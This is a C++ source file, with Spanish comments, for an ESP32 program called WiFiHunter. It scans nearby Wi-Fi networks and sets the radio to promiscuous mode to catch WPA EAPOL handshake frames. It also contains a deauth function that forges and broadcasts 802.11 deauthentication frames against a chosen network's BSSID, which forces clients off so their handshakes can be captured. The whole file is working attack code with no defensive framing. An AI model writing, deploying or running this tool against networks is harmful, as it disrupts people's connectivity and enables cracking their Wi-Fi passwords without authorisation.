#include "WiFiHunter.h"

// Inicialización de estáticos
WiFiHunter* WiFiHunter::instance = nullptr;
HandshakeCallback WiFiHunter::handshakeCB = nullptr;

void WiFiHunter::begin() {
    instance = this;
    
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    delay(100);
    
    // Ponemos el ESP en modo promiscuo para escuchar todo el tráfico WiFi
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    
    Serial.println("Modo promiscuo activado, a husmear!");
}

// Inicia escaneo de redes de forma asíncrona
void WiFiHunter::startScan() {
    // Salimos de promiscuo para evitar conflictos
    esp_wifi_set_promiscuous(false);
    // Escaneo asíncrono: el segundo parámetro 'false' indica async
    WiFi.scanNetworks(true, false);
    Serial.println("Escaneando redes...");
}

// Devuelve true si el escaneo ha terminado
bool WiFiHunter::isScanDone() {
    int status = WiFi.scanComplete();
    return (status >= 0);  // -1 = escaneando, -2 = no iniciado
}

// Obtiene los resultados del escaneo y los copia a nuestro array
void WiFiHunter::getScanResults(RedInfo* resultados, int maxRedes, int& encontradas) {
    int n = WiFi.scanComplete();
    if (n <= 0) {
        encontradas = 0;
        return;
    }
    
    encontradas = (n < maxRedes) ? n : maxRedes;
    for (int i = 0; i < encontradas; i++) {
        strncpy(resultados[i].ssid, WiFi.SSID(i).c_str(), 32);
        resultados[i].ssid[32] = '\0';
        
        memcpy(resultados[i].bssid, WiFi.BSSID(i), 6);
        resultados[i].rssi = WiFi.RSSI(i);
        resultados[i].canal = WiFi.channel(i);
        resultados[i].tieneClave = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        resultados[i].handshakeCapturado = false;
    }
    
    WiFi.scanDelete();   // liberamos memoria
    // Volvemos a activar modo promiscuo para seguir capturando
    esp_wifi_set_promiscuous(true);
    Serial.printf("Encontradas %d redes\n", encontradas);
}

// Callback que se ejecuta en contexto de interrupción cuando llega un paquete
void WiFiHunter::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t *frame = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    
    if (len < 100) return;  // descartamos tramas muy cortas
    
    // Buscamos EAPOL (handshake) dentro del payload.
    // El offset típico es 24 para el header 802.11, pero a veces puede ser 26 si hay QoS.
    // Para simplificar, probamos ambos.
    int offset = 24;
    bool encontrado = false;
    
    // Buscamos el patrón característico de EAPOL: AA AA 03 00 00 00 88 8E
    for (int i = offset; i < len - 8; i++) {
        if (frame[i] == 0xAA && frame[i+1] == 0xAA && frame[i+2] == 0x03 &&
            frame[i+6] == 0x88 && frame[i+7] == 0x8E) {
            
            // Verificamos que sea EAPOL-Key (type 3)
            if (frame[i+9] == 0x03) {
                // ¡Bingo! Tenemos un handshake
                // Guardamos en la cola circular para procesar desde el loop
                if (instance) {
                    int next = (instance->head + 1) % MAX_PENDING_HS;
                    if (next != instance->tail) {
                        uint32_t copyLen = (len < 256) ? len : 256;
                        memcpy(instance->pending[instance->head].frame, frame, copyLen);
                        instance->pending[instance->head].len = copyLen;
                        instance->head = next;
                    } else {
                        Serial.println("Cola de handshakes llena! Se perdió uno.");
                    }
                }
                encontrado = true;
                break;
            }
        }
    }
    
    // Si no lo encontramos con offset 24, probamos con 26 (QoS)
    if (!encontrado && len > 26) {
        offset = 26;
        for (int i = offset; i < len - 8; i++) {
            if (frame[i] == 0xAA && frame[i+1] == 0xAA && frame[i+2] == 0x03 &&
                frame[i+6] == 0x88 && frame[i+7] == 0x8E) {
                if (frame[i+9] == 0x03) {
                    if (instance) {
                        int next = (instance->head + 1) % MAX_PENDING_HS;
                        if (next != instance->tail) {
                            uint32_t copyLen = (len < 256) ? len : 256;
                            memcpy(instance->pending[instance->head].frame, frame, copyLen);
                            instance->pending[instance->head].len = copyLen;
                            instance->head = next;
                        }
                    }
                    break;
                }
            }
        }
    }
}

// Procesa los handshakes encolados (llamar desde loop)
void WiFiHunter::processPendingHandshakes() {
    while (tail != head) {
        if (handshakeCB) {
            handshakeCB(pending[tail].frame, pending[tail].len);
        }
        tail = (tail + 1) % MAX_PENDING_HS;
    }
}

void WiFiHunter::setHandshakeCallback(HandshakeCallback cb) {
    handshakeCB = cb;
}

// Envía un paquete de deauth a la red indicada
void WiFiHunter::deauth(const RedInfo& red) {
    uint8_t deauthFrame[26];
    
    deauthFrame[0] = 0xC0;   // Tipo: Deauthentication
    deauthFrame[1] = 0x00;
    deauthFrame[2] = 0x3A;
    deauthFrame[3] = 0x01;
    
    // Dirección destino: broadcast (FF:FF:FF:FF:FF:FF)
    memset(&deauthFrame[4], 0xFF, 6);
    
    // Dirección origen: nuestra MAC
    uint8_t nuestraMac[6];
    esp_wifi_get_mac(WIFI_IF_STA, nuestraMac);
    memcpy(&deauthFrame[10], nuestraMac, 6);
    
    // BSSID: el de la red objetivo
    memcpy(&deauthFrame[16], red.bssid, 6);
    
    // Código de razón: 0x07 = Class 3 frame from nonassociated station
    deauthFrame[24] = 0x07;
    deauthFrame[25] = 0x00;
    
    // Enviamos el frame
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, false);
    Serial.printf("Deauth enviado a %02X:%02X:%02X:%02X:%02X:%02X\n",
        red.bssid[0], red.bssid[1], red.bssid[2],
        red.bssid[3], red.bssid[4], red.bssid[5]);
}
